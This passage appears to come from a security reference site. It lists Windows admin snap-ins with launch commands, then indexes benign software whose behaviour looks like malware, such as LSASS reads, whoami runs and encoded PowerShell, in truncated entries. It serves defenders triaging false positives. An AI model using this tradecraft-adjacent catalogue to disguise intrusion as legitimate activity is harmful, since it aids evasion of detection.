**Categories:** GUI, MMC Snap-in, Manage, RSAT
```
adsiedit.msc
```

#### azman.msc
Authorization Manager; Type: MMC Snap-in; Toolsets: GUI, RSAT
**Categories:** GUI, MMC Snap-in, Manage, RSAT
```
azman.msc
```

#### certsrv.msc
Certificate Authority; Type: MMC Snap-in; Toolsets: GUI, RSAT
**Categories:** GUI, MMC Snap-in, Manage, RSAT
```
certsrv.msc /COMPUTER:CASUB1.AD.BITSADMIN.COM
```

#### certtmpl.msc
Certificate Templates; Type: MMC Snap-in; Toolsets: GUI, RSAT
**Categories:** GUI, MMC Snap-in, Manage, RSAT
```
certtmpl.msc
```

#### CluAdmin.msc
Failover Cluster Manager; Type: MMC Snap-in; Toolsets: GUI, RSAT
**Categories:** GUI, MMC Snap-in, Manage, RSAT
```
CluAdmin.msc
```

#### dhcpmgmt.msc
DHCP; Type: MMC Snap-in; Toolsets: GUI, RSAT
**Categories:** GUI, MMC Snap-in, Manage, RSAT
```
dhcpmgmt.msc /ComputerName DC1.ad.bitsadmin.com
```

#### dnsmgmt.msc
DNS Manager; Type: MMC Snap-in; Toolsets: GUI, RSAT
**Categories:** GUI, MMC Snap-in, Manage, RSAT
```
dnsmgmt.msc /ComputerName DC1.ad.bitsadmin.com
```

#### fsrm.msc
File Server Resource Manager; Type: MMC Snap-in; Toolsets: GUI, RSAT
**Categories:** GUI, MMC Snap-in, Manage, RSAT
```
fsrm.msc
```

#### fxsadmin.msc
Fax Service Manager; Type: MMC Snap-in; Toolsets: GUI, Server
**Categories:** GUI, MMC Snap-in, Manage, Server
```
fxsadmin.msc
```

#### iis.msc
Internet Information Services (IIS) Manager; Type: MMC Snap-in; Toolsets: GUI
**Categories:** GUI, MMC Snap-in, Manage
```
iis.msc
```

#### iis6.msc
Internet Information Services (IIS) 6.0 Manager; Type: MMC Snap-in; Toolsets: GUI
**Categories:** GUI, MMC Snap-in, Manage
```
iis6.msc
```

#### lsdiag.msc
Remote Desktop Licensing Diagnoser; Type: MMC Snap-in; Toolsets: GUI, RSAT
**Categories:** GUI, MMC Snap-in, Manage, RSAT
```
lsdiag.msc
```

#### Microsoft.IdentityServer.msc
AD FS Management; Type: MMC Snap-in; Toolsets: GUI, Server
**Categories:** GUI, MMC Snap-in, Manage, Server
```
%SystemRoot%\ADFS\Microsoft.IdentityServer.msc
```

#### nfsmgmt.msc
Services for NFS; Type: MMC Snap-in; Toolsets: GUI, RSAT
**Categories:** GUI, MMC Snap-in, Manage, RSAT
```
nfsmgmt.msc
```

#### nps.msc
Network Policy Server; Type: MMC Snap-in; Toolsets: GUI, Server
**Categories:** GUI, MMC Snap-in, Manage, Server
```
nps.msc /computer:DC1.ad.bitsadmin.com
```

#### ocsp.msc
Online Responder Management; Type: MMC Snap-in; Toolsets: GUI, RSAT
**Categories:** GUI, MMC Snap-in, Manage, RSAT
```
ocsp.msc /Computer:DC1.ad.bitsadmin.com
```

#### pkiview.msc
Enterprise PKI; Type: MMC Snap-in; Toolsets: GUI, RSAT
**Categories:** GUI, MMC Snap-in, Manage, RSAT
```
pkiview.msc
```

#### RAMgmtUI.exe
Remote Access Management; Type: MMC Snap-in; Toolsets: GUI, RSAT
**Categories:** GUI, MMC Snap-in, Manage, RSAT
```
RAMgmtUI.exe -computerName DC1.ad.bitsadmin.com
```

#### remoteprograms.msc
RemoteApp Manager; Type: MMC Snap-in; Toolsets: GUI, Server
**Categories:** GUI, MMC Snap-in, Manage, Server
```
remoteprograms.msc
```

#### rrasmgmt.msc
Routing and Remote Access; Type: MMC Snap-in; Toolsets: GUI, RSAT
**Categories:** GUI, MMC Snap-in, Manage, RSAT
```
rrasmgmt.msc /ComputerName DC1.ad.bitsadmin.com
```

#### tapimgmt.msc
Telephony; Type: MMC Snap-in; Toolsets: GUI, Server
**Categories:** GUI, MMC Snap-in, Manage, Server
```
tapimgmt.msc
```

#### tsadmin.msc
Remote Desktop Services Manager; Type: MMC Snap-in; Toolsets: GUI, Server
**Categories:** GUI, MMC Snap-in, Manage, Server
```
tsadmin.msc
```

#### tsconfig.msc
Remote Desktop Session Host Configuration; Type: MMC Snap-in; Toolsets: GUI, Server
**Categories:** GUI, MMC Snap-in, Manage, Server
```
tsconfig.msc
```

#### tsgateway.msc
RD Gateway Manager; Type: MMC Snap-in; Toolsets: GUI, RSAT
**Categories:** GUI, MMC Snap-in, Manage, RSAT
```
tsgateway.msc
```

#### virtmgmt.msc
Hyper-V Manager; Type: MMC Snap-in; Toolsets: GUI, RSAT
**Categories:** GUI, MMC Snap-in, Manage, RSAT
```
virtmgmt.msc
```

#### wbadmin.msc
Windows Server Backup; Type: MMC Snap-in; MITRE ATT&CK: T1485; Toolsets: GUI, Server
**Categories:** GUI, MMC Snap-in, Manage, Server, T1485
```
mmc.exe
```

#### WdsMgmt.msc
Windows Deployment Services; Type: MMC Snap-in; Toolsets: GUI, RSAT
**Categories:** GUI, MMC Snap-in, Manage, RSAT
```
WdsMgmt.msc
```

#### winsmgmt.msc
WINS; Type: MMC Snap-in; Toolsets: GUI, RSAT
**Categories:** GUI, MMC Snap-in, Manage, RSAT
```
winsmgmt.msc
```

#### wsus.msc
Update Services; Type: MMC Snap-in; Toolsets: GUI, RSAT
**Categories:** GUI, MMC Snap-in, Manage, RSAT
```
wsus.msc
```

### imanage

#### iManage Document Protection
Random file extensions from iManage


   
When Office documents are protected by iManage, upon opening them they crea...
**Categories:** imanage, windows

### logmein

#### LogMeIn and CScript
Who doesn't love CScript?


   
LogMeIn runs `avfilter.js` via `cscript` to check what AV is running on your system f...
**Categories:** logmein, windows, cscript

### mcafee

#### McAfee Antivirus
McAfee also loves big DNS queries!


   
Various McAfee performs odd DNS lookups to subdomains of `avqs.mcafee.com` a...
**Categories:** mcafee, windows, dns

### microsoft

#### CCM.exe (SCCM)
Windows Config Manager CCM.exe runs b64-encoded powershell.  



The commands can be large enough to take multiple Ev...
**Categories:** microsoft, windows, powershell

#### SenseNdr.exe
SenseNDR base64 encoding


   
SenseNDR, a component of [Microsoft Defender for Endpoint](https://docs.microsoft.com/...
**Categories:** microsoft, windows, defender

#### Skype.exe
It runs whoami because it's lost.
**Categories:** microsoft, whoami, cmd

### network

#### Windows TCP Connections on High Ports
Windows uses random high service ports for a variety of functions. 



Without knowing this, these connections seem m...
**Categories:** network, windows, microsoft

### nim

#### Nim Lang install binaries
The Nim language installer binaries in certain versions trigger Windows Defender. 



These include `nimble.exe`, `fi...
**Categories:** nim, windows, defender

### paloalto

#### PanGpHip.exe
Palo Alto GP Firewall HIP check runs whoami.exe as SYSTEM.
**Categories:** paloalto, vpn, cmd, whoami

### ringcentral

#### RingCentral.exe
How to look like malware, by RingCentral


   
Binary installs deep in `AppData`, drops a `setDefaultAppByProtcol.vbs...
**Categories:** ringcentral, windows, cscript, vbscript

### sentinelone

#### SentinelOne
EDRs 🤝 Malware

 Encoded PowerShell


   
A legitimate PowerShell script associated with SentinelOne includes encoded...
**Categories:** sentinelone, powershell

### sophos

#### Sophos Web Protection (sophosxl.net)
Do you like giant DNS queries? Sophos does.



Sophos Web Protection, for reasons surpassing understanding, performs...
**Categories:** sophos, dns

### trendmicro

#### HostedAgent.exe
Whoami? HostedAgent, of course!


 
Trend Micro WFBS Agent runs `whoami.exe` regularly as SYSTEM for reasons unknown.
**Categories:** trendmicro, windows, whoami

### Uncategorized

#### WTFBins
WTFBins

#### WTFBins - About
WTFBins - About

#### WTFBins - Contribute
WTFBins - Contribute

### windows

#### Adobe Genuine Monitor Service
A little LSASS, as a treat.


   
Adobe Genuine Monitor Service (`AGMService.exe`) opens and reads from the LSASS pro...
**Categories:** windows, adobe, lsass

#### Bloodhound.exe
Not the Bloodhound you're thinking of.


   
Silver Bullet Technology's Ranger runs an executable called Bloodhound.e...
**Categories:** windows, silverbullet, bloodhound

#### Cisco Jabber
Cisco enumerates your system.


   
`CiscoJabberPrt.exe` will pipe `ipconfig.exe /all`, `systeminfo.exe`, and `taskli...
**Categories:** windows, cisco, filewrite

#### draw.io.exe
Nothing to see here


   
`draw.io.exe` uses `attrib.exe` to hide the file `.dtmp` using the command `attrib +h filen...
**Categories:** windows, draw.io

#### EndpointBasecamp.exe, RiskIndexCollector.exe
A little wmic enumeration


   
Trend Micro `EndpointBasecamp.exe` drops `RiskIndexCollector.exe` which invoke `wmic`...
**Categories:** windows, trendmicro, wmi

#### ESET AV Module (ekrn.exe)
What is it with antivirus and weird DNS?



ESET NOD32 Antivirus kernel (`ekrn.exe`) performs random-looking Domain N...
**Categories:** windows, eset, dns

#### explorer.exe
Guests are not invited to Everyone shares.


   
Sharing a Windows folder with `Everyone` permissions, will cause a f...
**Categories:** windows, explorer

#### IBM Storage Insights Data Collector
IBM creates WMI false positives


   
The data collector periodically runs a command like: `cmd.exe /c wmic process c...
**Categories:** windows, ibm, wmi

#### IBM's pcsnp.exe triggers SYSTEM cmd.exe
IBM's `pcsnp.exe` just...what


   
IBM's `pcsnp.exe` calls `cmd.exe /c mkdir C:\Temp` from processes such as `mpnoti...
**Categories:** windows, cmd, ibm

#### Ivanti Endpoint Manager
Ivanti does some weird stuff


   
The command-line arguments for the exes listed below occasionally contain fragment...
**Categories:** windows, ivanti

#### JetBrains binaries invoke WMI
JetBrains queries security tools.


   
`idea64.exe` and `rider64.exe` from JetBrains query the installed antivirus p...
**Categories:** windows, jetbrains, wmi

#### Microsoft Managed Desktop Agent
Microsoft loves to look like malware, huh?



[Microsoft Management Services Cloud Managed Desktop Agent](https://lea...
**Categories:** windows, microsoft, powershell

#### Network Detective Data Collector (nddc.exe)
WMIExec-ish NDCC


   
The executable for Network Detective Data Collector displays false positive activity similar t...
**Categories:** windows, network, impacket

#### Noregon Fake Windows Components
Named after legitimate Windows binaries, in the wrong location. 



They were spawned in succession from `C:\Program...
**Categories:** windows, noregon, fake

#### Nutanix Guest Tools
Yet another base64-loving process. 



In this case, the encoded commands are also WMI PowerShell commands.
**Categories:** windows, nutanix, base64

#### OpenVAS runs WMIExec
TFW the vuln scanner runs offensive tools.


   
When connecting to Windows hosts, OpenVAS will run impacket-wmiexec...
**Categories:** windows, impacket, greenbone, openvas

#### SecurityHealthService.exe unprotects LSA
Who needs protection? Not LSA!


   
Sets `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL` to 0 (= insecure = mig...
**Categories:** windows, lsass

#### SenseIR.exe
How much can an EDR look like malware?



Microsoft Defender Advanced Threat Protection uses SenseIR.exe to launch Po...
**Categories:** windows, defender, base64

#### Snow Inventory Agent for Windows
Yet another PowerShell weirdo.



Snow Inventory Agent for Windows (`snowagent.exe`) runs PowerShell which resembles...
**Categories:** windows, snow, powershell

#### Startupscan.dll
Windows being sus? Inconceivable!



Windows executes a suspiciously named DLL export with a name of `SusRunTask`, an...
**Categories:** windows, dll

#### Teramind's dwm.exe
Nacho dwm


   
Teramind installs its own dwm.exe file inside a subfolder of `C:\ProgramData\{4cec2908-5ce4-48f0-a717...
**Categories:** windows, teramind

#### Veritas Backup Agent (Symantec)
Another bin with an identity crisis.



[Microsoft Management Services Cloud Managed Desktop Agent](https://learn.mic...
**Categories:** windows, whoami, symantec

#### Windows Terminal
Windows Terminal runs `wsl` on startup.

Upon launch, Windows Terminal runs `wsl --list` to find potential Linux prof...
**Categories:** windows, microsoft, commandline
